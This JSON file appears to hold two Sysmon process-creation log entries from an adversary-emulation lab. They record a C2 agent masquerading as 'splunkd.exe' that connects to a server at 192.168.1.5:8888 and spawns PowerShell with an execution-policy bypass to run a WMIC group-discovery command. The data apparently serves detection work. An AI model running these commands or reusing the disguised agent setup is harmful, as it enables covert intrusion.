[
    {
        "CommandLine":"powershell.exe -ExecutionPolicy Bypass -C \"wmic.exe group get name\"",
        "Company":"Microsoft Corporation",
        "CurrentDirectory":"C:\\Users\\victim1\\Downloads\\winlogbeat-7.5.2-windows-x86_64\\winlogbeat-7.17.9-windows-x86_64\\",
        "Description":"Windows PowerShell",
        "EventRecordID":"35114",
        "FileVersion":"10.0.19041.546 (WinBuild.160101.0800)",
        "Hashes":"SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F",
        "Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "IntegrityLevel":"High",
        "LogonGuid":"{fbe589a2-781c-63f8-ec89-070000000000}",
        "LogonId":"0x00000000000789ec",
        "OriginalFileName":"PowerShell.EXE",
        "ParentCommandLine":"\"C:\\Users\\Public\\splunkd.exe\" -server http://192.168.1.5:8888 -group red",
        "ParentImage":"C:\\Users\\Public\\splunkd.exe",
        "ParentProcessGuid":"{fbe589a2-ff98-63fe-150e-000000001200}",
        "ParentProcessId":"5484",
        "ParentUser":"DESKTOP-IDQQB81\\victim1",
        "ProcessGuid":"{fbe589a2-4f85-6401-0c1a-000000001200}",
        "ProcessId":"1264","Product":"Microsoft® Windows® Operating System",
        "RuleName":"-",
        "TerminalSessionId":"1",
        "User":"DESKTOP-IDQQB81\\victim1",
        "UtcTime":"2023-03-03 01:38:13.179"
    },
    {
        "CommandLine":"\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" group get name",
        "Company":"Microsoft Corporation",
        "CurrentDirectory":"C:\\Users\\victim1\\Downloads\\winlogbeat-7.5.2-windows-x86_64\\winlogbeat-7.17.9-windows-x86_64\\",
        "Description":"WMI Commandline Utility",
        "EventRecordID":"35115",
        "FileVersion":"10.0.19041.1741 (WinBuild.160101.0800)",
        "Hashes":"SHA256=12ABB45620A7A1FFD8BB953DEBA3FCC30B8BA14B2FF523F1F519BF2BF6BA7D4C",
        "Image":"C:\\Windows\\System32\\wbem\\WMIC.exe",
        "IntegrityLevel":"High",
        "LogonGuid":"{fbe589a2-781c-63f8-ec89-070000000000}",
        "LogonId":"0x00000000000789ec",
        "OriginalFileName":"wmic.exe",
        "ParentCommandLine":"powershell.exe -ExecutionPolicy Bypass -C \"wmic.exe group get name\"",
        "ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ParentProcessGuid":"{fbe589a2-4f85-6401-0c1a-000000001200}",
        "ParentProcessId":"1264","ParentUser":"DESKTOP-IDQQB81\\victim1",
        "ProcessGuid":"{fbe589a2-4f85-6401-0d1a-000000001200}",
        "ProcessId":"5572",
        "Product":"Microsoft® Windows® Operating System",
        "RuleName":"-",
        "TerminalSessionId":"1",
        "User":"DESKTOP-IDQQB81\\victim1",
        "UtcTime":"2023-03-03 01:38:13.584"
    }
    ]